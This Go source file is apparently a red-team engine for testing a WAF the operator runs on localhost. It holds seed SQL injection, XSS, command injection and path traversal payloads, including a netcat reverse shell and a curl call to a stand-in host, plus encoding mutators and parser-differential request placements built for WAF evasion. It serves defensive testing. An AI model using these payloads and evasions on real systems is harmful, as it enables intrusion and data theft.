// Package redteam is an autonomous evaluation engine for the WAF. It does not
// follow a fixed script: it starts from seed attacks, and based on the WAF's
// own verdicts it keeps and mutates the ones that slip through, searching for
// an evasion the way published WAF testers (GoTestWAF's placement x encoding
// matrix, WAF-A-MoLE / AdvSQLi mutation search) do. Every attack is also sent
// straight to a demo backend that echoes what it parsed, so the engine knows
// whether a payload actually reached the application (a real bypass) or was
// dropped harmlessly.
//
// It is an evaluation tool aimed at one WAF the operator runs, on localhost.
package redteam

import (
	"net/url"
	"strings"
)

// Class is an attack family.
type Class string

const (
	SQLi      Class = "sqli"
	XSS       Class = "xss"
	CmdI      Class = "cmdi"
	Traversal Class = "traversal"
)

// Seed is a base attack. marker is a substring the demo backend echoes back
// when the payload reaches an application parameter, so landing is measured.
type Seed struct {
	Class   Class
	Payload string
	Marker  string
}

func seeds() []Seed {
	return []Seed{
		{SQLi, "1' UNION SELECT username,password FROM users--", "UNION SELECT"},
		{SQLi, "' OR '1'='1", "OR '1'='1"},
		{SQLi, "1; DROP TABLE users--", "DROP TABLE"},
		{SQLi, "1 AND SLEEP(5)", "SLEEP(5)"},
		{SQLi, "admin'--", "admin'--"},
		{XSS, "<script>alert(document.cookie)</script>", "alert(document.cookie)"},
		{XSS, "<img src=x onerror=alert(1)>", "onerror=alert(1)"},
		{XSS, "<svg/onload=alert(1)>", "onload=alert(1)"},
		{XSS, "javascript:alert(1)", "javascript:alert(1)"},
		{CmdI, "; cat /etc/passwd", "cat /etc/passwd"},
		{CmdI, "| nc attacker 4444 -e /bin/sh", "nc attacker 4444"},
		{CmdI, "$(curl evil.test)", "curl evil.test"},
		{CmdI, "`id`", "`id`"},
		{Traversal, "../../../../etc/passwd", "etc/passwd"},
		{Traversal, "....//....//etc/passwd", "etc/passwd"},
		{Traversal, "/var/www/../../etc/shadow", "etc/shadow"},
	}
}

// Mutator transforms a payload into an evasion variant. These are
// semantics-preserving against a permissive backend; the point is to see
// whether any of them changes the WAF's verdict.
type Mutator struct {
	Name string
	Fn   func(string) string
}

func mutators() []Mutator {
	return []Mutator{
		{"identity", func(s string) string { return s }},
		{"url-encode", func(s string) string { return pctAll(s) }},
		{"double-url-encode", func(s string) string { return pctAll(pctAll(s)) }},
		{"case-swap", caseSwap},
		{"sql-inline-comment", func(s string) string { return strings.ReplaceAll(s, " ", "/**/") }},
		{"sql-mysql-versioned", mysqlVersioned},
		{"whitespace-alt", func(s string) string { return strings.ReplaceAll(s, " ", "\t") }},
		{"html-entity", htmlEntity},
		{"unicode-fullwidth", fullwidth},
		{"nullbyte-insert", func(s string) string { return strings.ReplaceAll(s, "/", "\x00/") }},
		{"concat-comment", func(s string) string { return strings.Replace(s, " ", " /*!*/ ", 1) }},
	}
}

func pctAll(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' {
			b.WriteByte(c)
		} else {
			b.WriteString("%")
			const hex = "0123456789ABCDEF"
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0xf])
		}
	}
	return b.String()
}

func caseSwap(s string) string {
	r := []rune(s)
	for i := range r {
		if i%2 == 0 {
			r[i] = []rune(strings.ToUpper(string(r[i])))[0]
		} else {
			r[i] = []rune(strings.ToLower(string(r[i])))[0]
		}
	}
	return string(r)
}

func mysqlVersioned(s string) string {
	for _, kw := range []string{"UNION", "SELECT", "OR", "AND", "SLEEP", "DROP"} {
		s = replaceFold(s, kw, "/*!50000"+kw+"*/")
	}
	return s
}

func replaceFold(s, old, new string) string {
	ls, lo := strings.ToLower(s), strings.ToLower(old)
	i := strings.Index(ls, lo)
	if i < 0 {
		return s
	}
	return s[:i] + new + s[i+len(old):]
}

func htmlEntity(s string) string {
	rep := strings.NewReplacer("<", "&lt;", ">", "&gt;", "(", "&#40;", ")", "&#41;")
	return rep.Replace(s)
}

func fullwidth(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r >= '!' && r <= '~' {
			b.WriteRune(r - '!' + 0xFF01)
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// Placement embeds a payload into a request. structural placements change the
// request's shape (where published parser-differential bypasses live) rather
// than its text. applies reports whether the placement fits a class (XSS in a
// filename makes no sense).
type Placement struct {
	Name       string
	Structural bool
	Build      func(p string) Request
	// Splits marks placements that spread one payload over several values
	// (parameter pollution). A Go backend keeps them separate, so the attack
	// only lands if one received value carries the whole payload.
	Splits bool
}

// Request is a ready-to-send HTTP request described by value.
type Request struct {
	Method  string
	Path    string
	Headers [][2]string
	Body    []byte
}

func h(kv ...string) [][2]string {
	var out [][2]string
	for i := 0; i+1 < len(kv); i += 2 {
		out = append(out, [2]string{kv[i], kv[i+1]})
	}
	return out
}

func placements() []Placement {
	ctJSON := h("Content-Type", "application/json")
	ctForm := h("Content-Type", "application/x-www-form-urlencoded")
	ctMP := h("Content-Type", "multipart/form-data; boundary=XB")
	jsonEsc := func(p string) string {
		b, _ := jsonMarshalString(p)
		return b
	}
	return []Placement{
		{"query", false, func(p string) Request {
			return Request{"GET", "/search?q=" + url.QueryEscape(p), nil, nil}
		}, false},
		{"form-body", false, func(p string) Request {
			return Request{"POST", "/form", ctForm, []byte("comment=" + url.QueryEscape(p) + "&x=1")}
		}, false},
		{"json-value", false, func(p string) Request {
			return Request{"POST", "/api", ctJSON, []byte(`{"q":` + jsonEsc(p) + `}`)}
		}, false},
		{"header", false, func(p string) Request {
			return Request{"GET", "/search?q=1", h("X-Search", oneLine(p)), nil}
		}, false},
		{"cookie", false, func(p string) Request {
			return Request{"GET", "/search?q=1", h("Cookie", "sid="+oneLine(p)), nil}
		}, false},
		// structural / parser-differential placements
		{"json-dup-key", true, func(p string) Request {
			return Request{"POST", "/api", ctJSON, []byte(`{"q":"safe","q":` + jsonEsc(p) + `}`)}
		}, false},
		{"json-case-key", true, func(p string) Request {
			return Request{"POST", "/api", ctJSON, []byte(`{"q":"safe","Q":` + jsonEsc(p) + `}`)}
		}, false},
		{"json-as-textplain", true, func(p string) Request {
			return Request{"POST", "/api", h("Content-Type", "text/plain"), []byte(`{"q":` + jsonEsc(p) + `}`)}
		}, false},
		{"multipart-after-close", true, func(p string) Request {
			b := "--XB\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx\r\n--XB--\r\n" +
				"--XB\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n" + p + "\r\n--XB--\r\n"
			return Request{"POST", "/upload", ctMP, []byte(b)}
		}, false},
		{"multipart-lf", true, func(p string) Request {
			b := "--XB\nContent-Disposition: form-data; name=\"q\"\n\n" + p + "\n--XB--\n"
			return Request{"POST", "/upload", ctMP, []byte(b)}
		}, false},
		{"hpp-split", true, func(p string) Request {
			parts := splitHalf(p)
			return Request{"GET", "/search?q=" + url.QueryEscape(parts[0]) + "&q=" + url.QueryEscape(parts[1]), nil, nil}
		}, true},
	}
}

func oneLine(s string) string { return strings.NewReplacer("\r", " ", "\n", " ").Replace(s) }

func splitHalf(s string) [2]string {
	m := len(s) / 2
	return [2]string{s[:m], s[m:]}
}

// Placements returns the request placements (exported for evidence replay).
func Placements() []Placement { return placements() }
